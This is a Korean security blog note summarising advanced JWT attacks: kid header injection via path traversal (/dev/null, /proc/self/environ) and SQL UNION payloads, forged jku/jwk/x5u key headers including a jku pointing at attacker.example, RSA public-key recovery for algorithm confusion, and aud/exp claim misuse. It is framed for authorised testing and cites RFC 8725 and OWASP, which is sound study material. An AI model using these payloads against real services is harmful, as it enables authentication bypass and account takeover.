---
title: "JWT 심화 (kid·jku·키 노출)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, JWT]
tags: [jwt, kid-injection, jku, web]
description: "기본 JWT 공격을 넘어 kid 주입·jku/jwk 헤더 신뢰·공개키 추정·클레임 혼동 같은 심화 공격의 개념과 구문을 정리합니다."
mermaid: true
---

> 기본 개념은 [JWT 취약점](/notes/jwt-vulnerabilities/)에서 다뤘다. 이 글은 헤더의 **키 참조 필드(kid·jku·jwk·x5u)** 와 키 노출을 이용한 심화 공격을 본다 — 서명을 깨는 게 아니라 검증 키를 바꿔치기한다.

## 개념

JWT 헤더는 검증에 쓸 키를 가리키는 필드를 담을 수 있다. 서버가 이 필드를 그대로 신뢰하면, 공격자가 **자기 키로 서명하고 그 키를 가리키게** 만들어 통과시킨다. `kid`는 키 저장소 조회에 쓰여 경로 조작·SQLi로도 번진다.

```json
{"alg":"RS256","kid":"keys/pub1.pem"}     // kid 가 파일 경로로 쓰이면 조작 가능
{"alg":"RS256","jku":"https://trusted/jwks.json"}  // jku 를 공격자 URL로
```

## 공격·우회 구문

허가된 범위·본인 토큰으로만.

### kid 주입 (경로·SQL·키 고정)

```
kid: ../../dev/null  + alg:HS256 + 빈 키("")로 HMAC 서명  → 키가 빈 파일이면 통과
kid: /proc/self/environ 등 예측 가능한 파일을 키로 사용
kid: ' UNION SELECT 'attacker_key'-- -   (kid 가 SQL 조회면 주입)
kid: ../../../tmp/uploaded.pem  (업로드한 공개키를 가리킴)
```

### jku / jwk / x5u 신뢰

```
jwk: 헤더에 공격자 공개키를 직접 넣고 그 키로 서명(서버가 헤더 jwk 를 쓰면 통과)
jku: "https://attacker.example/jwks.json"  → 공격자 JWKS 로 검증 유도
  우회: 허용 도메인 검증을 SSRF/오픈리다이렉트/@ 로 깨기
x5u/x5c: 공격자 인증서 체인 주입
```

### 공개키 추정 (RSA)

```
서명된 토큰 2개 이상으로 RSA 공개키(n,e) 복원 → 그 공개키로 HS256 알고리즘 혼동
(공개키 미공개 환경에서 공개키를 얻는 보조 경로)
```

### 클레임·대상 혼동

```
다른 서비스용 aud 토큰을 재사용(aud 검증 없음)
exp 과거로 수정한 서명 유효 토큰이 거부되는지
```

## 참고 자료

- [RFC 8725: JWT Best Current Practices](https://www.rfc-editor.org/info/rfc8725/)
- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
